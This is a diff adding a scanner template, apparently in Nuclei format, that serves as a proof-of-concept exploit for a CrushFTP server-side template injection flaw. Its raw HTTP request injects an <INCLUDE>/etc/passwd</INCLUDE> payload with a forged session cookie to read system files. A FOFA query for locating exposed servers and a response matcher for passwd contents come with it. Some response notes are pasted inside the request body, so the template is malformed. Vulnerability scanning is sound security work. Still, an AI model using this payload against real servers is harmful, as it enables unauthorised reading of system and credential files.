@@ -1,0 +1,46 @@
+id: poc-wpw2cgrillvrzqh7
+info:
+  name: CrushFTP 服务器端 模板注入漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wpw2cgrillvrzqh7'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wpw2cgrillvrzqh7
+    fofa: server="CrushFTP"
+http:
+- raw:
+  - 'GET /WebInterface/function/?command=zip&c2f=7HhJ&path=%3CINCLUDE%3E/etc/passwd%3C/INCLUDE%3E&names=* HTTP/1.1
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept: */*
+
+
+    Connection: close
+
+
+    Cookie: currentAuth=7HhJ;CrushAuth=1714275533532_zx4ngKqwkGsIvlbmG8U3Tv0Q1r7HhJ
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?root)(?=.*?bin).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
